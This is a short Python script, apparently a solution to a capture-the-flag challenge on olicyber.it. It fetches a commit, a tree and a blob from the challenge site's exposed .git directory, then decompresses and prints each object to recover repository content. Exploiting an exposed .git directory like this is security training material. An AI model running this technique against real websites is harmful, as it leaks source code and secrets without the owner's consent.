import requests
import zlib

commit = "bf0699b27af5f029be8e2b24b8de2f8d9bace4a9"
url = f"http://iforgot.challs.olicyber.it/.git/objects/{commit[:2]}/{commit[2:]}"
r = requests.get(url)

decompressed = zlib.decompress(r.content)
print(decompressed.decode('utf-8', errors='replace'), end="\n\n")


tree = "5f8a887f521b9e153d07657fe408c931d36bb6cc"
url = f"http://iforgot.challs.olicyber.it/.git/objects/{tree[:2]}/{tree[2:]}"
r = requests.get(url)

decompressed = zlib.decompress(r.content)
print(decompressed.decode('utf-8', errors='replace'), end="\n\n")


blob = "9456de70710a02489c44f104fb2b002cc08bf31a"
url = f"http://iforgot.challs.olicyber.it/.git/objects/{blob[:2]}/{blob[2:]}"
r = requests.get(url)

decompressed = zlib.decompress(r.content)
print(decompressed.decode('utf-8', errors='replace'))